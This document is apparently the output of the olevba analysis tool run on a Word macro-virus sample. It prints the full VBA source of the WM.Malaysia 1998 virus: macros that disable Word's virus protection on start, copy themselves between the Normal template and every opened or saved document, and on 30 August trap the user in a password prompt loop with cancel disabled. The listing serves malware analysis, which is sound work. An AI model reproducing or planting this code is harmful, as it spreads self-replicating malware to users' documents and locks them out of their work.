olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Proteced.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Proteced.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Malaysia1998.bas 
in file: ./Virus.MSWord.Proteced.e - OLE stream: 'Macros/VBA/Malaysia1998'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoExec()

Options.VirusProtection = False

End Sub

Sub AutoOpen()

On Error GoTo err
Options.SaveNormalPrompt = False
DocumentToNormal
NormalTemplate.Save
err:

End Sub

Sub FileOpen()

Application.EnableCancelKey = wdCancelDisabled
On Error GoTo err
   Options.VirusProtection = False
   Dialogs(wdDialogFileOpen).Show
err:
Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub FileSave()

Application.EnableCancelKey = wdCancelDisabled
Trigger
On Error GoTo err
   NormalToDocument
   ActiveDocument.Save
err:
Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub FileSaveAs()
Attribute FileSaveAs.VB_Description = "Macro recorded 04/09/98 by Ng Bing Yew"
Attribute FileSaveAs.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Macro2"

Application.EnableCancelKey = wdCancelDisabled
Trigger
On Error GoTo err
   NormalToDocument
   Dialogs(wdDialogFileSaveAs).Show
err:
Application.EnableCancelKey = wdCancelInterrupt

End Sub

Sub NormalToDocument()

On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "Malaysia1998"
   Application.OrganizerCopy Source:=global_temp, _
   Destination:=cur_doc, Name:=macroname, _
   Object:=wdOrganizerObjectProjectItems
err:

End Sub

Sub DocumentToNormal()

On Error GoTo err
   cur_doc = ActiveDocument.FullName
   global_temp = NormalTemplate.FullName
   macroname = "Malaysia1998"
   Application.OrganizerCopy Source:=cur_doc, _
                             Destination:=global_temp, _
                             Name:=macroname, _
                             Object:=wdOrganizerObjectProjectItems
err:
   
End Sub

Sub Trigger()

On Error GoTo err
   Todaydate = Date
   If (Month(Todaydate) = 8) And (Day(Todaydate) = 30) Then
       Do
         cr = Chr(13) + Chr(10)
         titles = "WM.MALAYSIA 1998"
         msg1 = "You are lucky!!! You have met WM.MALAYSIA 1998!!!" + cr
         msg2 = "WM.MALAYSIA 1998 is Malaysian's first MACRO VIRUS." + cr
         msg3 = "It is written by a young college student -- BAD LOGIC." + cr
         msg4 = cr + cr + cr + cr + "Please ENTER CORRECT password: "
         msg = msg1 + msg2 + msg3 + msg4
         response = InputBox(msg, titles)
       Loop While (response <> "WM.MALAYSIA 1998")
    End If
err:

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

